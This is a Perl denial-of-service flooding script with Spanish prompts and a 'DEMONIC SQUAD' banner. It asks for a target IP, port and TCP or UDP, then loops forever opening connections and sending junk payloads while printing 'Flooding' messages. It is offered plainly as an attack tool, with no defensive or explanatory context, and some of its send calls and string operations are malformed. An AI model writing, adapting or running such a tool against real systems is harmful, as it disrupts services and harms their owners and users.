use IO::Socket;
use Scalar::Util qw(looks_like_number);

system("cls || clear");
print q{
██████╗░███████╗███╗░░░███╗░█████╗░███╗░░██╗██╗░█████╗░  ░██████╗░██████╗░██╗░░░██╗░█████╗░██████╗░
██╔══██╗██╔════╝████╗░████║██╔══██╗████╗░██║██║██╔══██╗  ██╔════╝██╔═══██╗██║░░░██║██╔══██╗██╔══██╗
██║░░██║█████╗░░██╔████╔██║██║░░██║██╔██╗██║██║██║░░╚═╝  ╚█████╗░██║██╗██║██║░░░██║███████║██║░░██║
██║░░██║██╔══╝░░██║╚██╔╝██║██║░░██║██║╚████║██║██║░░██╗  ░╚═══██╗╚██████╔╝██║░░░██║██╔══██║██║░░██║
██████╔╝███████╗██║░╚═╝░██║╚█████╔╝██║░╚███║██║╚█████╔╝  ██████╔╝░╚═██╔═╝░╚██████╔╝██║░░██║██████╔╝
╚═════╝░╚══════╝╚═╝░░░░░╚═╝░╚════╝░╚═╝░░╚══╝╚═╝░╚════╝░  ╚═════╝░░░░╚═╝░░░░╚═════╝░╚═╝░░╚═╝╚═════╝░};
my $check = IO::Socket::INET->new( 'PeerAddr'=>'www.google.com', 
	'PeerPort'=>80, 
	'Timeout'=>2, 
	'proto'=>'tcp');
if(!(defined $check && $check)){
	print("[-] Estado de Internet [No conectado]");
	print("\n[!] Error: Por favor revise su conexion a internet.");
	exit(1);
}
$check->close();
print "\n===============================";
print "\n[~] Ingrese IP: "; 
$host = <STDIN>;
chomp ($host);
while ($host eq ""){
 print "   [!] IP?: ";
 $host = <STDIN>;
 chomp ($host);
}
print "Target ==> $host";
print "\n===============================";
print "\n[~] Puerto: "; 
$port = <STDIN>;
chomp ($port);
while ($port eq "" || !looks_like_number($port) || !grep{$port eq $_}(0..65535)){ 
 print "   [!] Ingresa el puerto: ";       
 $port = <STDIN>;
 chomp ($port); 
} 
print "PORT ==> $port";
print "\n===============================";
print "\n[~] Ingrese el protocólo (TCP o UDP) :"; 
$proto = <STDIN>;
chomp ($proto);
while ($proto eq "" || !grep{$proto eq $_} 'TCP','UDP','tcp','udp'){
 print "   [!] Ingresa el protocólo (TCP or UDP) ?: ";
 $proto = <STDIN>;
 chomp ($proto);
}
print "Protocólo ==> $proto";
print "\n===============================\n";
sleep(1);

$sock = IO::Socket::INET->new(
        PeerAddr => $host,
        PeerPort => $port,
        Proto => "$proto" ) || die "\n[!] Error de conexión al destino [$host] en el puerto [$port/$proto]\n[!] Por favor checkea la IP\n";
system("clear || cls");
print "\n[*] Ataque iniciado [$host:$port] protocólo => [$proto].......\n\n";
sleep(1);
while (1) {
  if(grep{$proto eq $_} 'TCP','tcp'){
       $sock = IO::Socket::INET->new(
        PeerAddr => $host,
        PeerPort => $port,
        Proto => "$proto" ) || die "\n[!] Conexión fallida al destino [$host] en el puerto [$port/$proto]\n[!] Por favor checkea la IP\n";
        for($i=0; $i<=500; $i++){
            $size = rand() * 8921873 * 99919988;
            print ("Flooding: (=>$host:$port~$proto<=) Paquetes enviados: $size\n");
            send($sock, $size*2, $size*2); 
            send($sock, $size*3, $size*3);
            send($sock, $size*4, $size*4);
            send($sock, $size*9999999999999,$size*9999999999999);
            send($sock, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@#@#%23%235543wewreqwr#@523sdfsa"*2, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@asasf#@#%23%235543wewreqwr#@523sdfsa"*3);
        }

  }else{
            $size = rand() * 8921873 * 99919988;
            print ("Flooding: (=>$host:$port~$proto<=) Paquetes enviados: $size\n");
            send($sock, $size*2, $size*2); 
            send($sock, $size*3, $size*3);
            send($sock, $size*4, $size*4);
            send($sock, $size*9999999999999,$size*9999999999999);
            send($sock, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@#@#%23%235543wewreqwr#@523sdfsa"*2, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@asasf#@#%23%235543wewreqwr#@523sdfsa"*3);
 }
}
$sock->close()
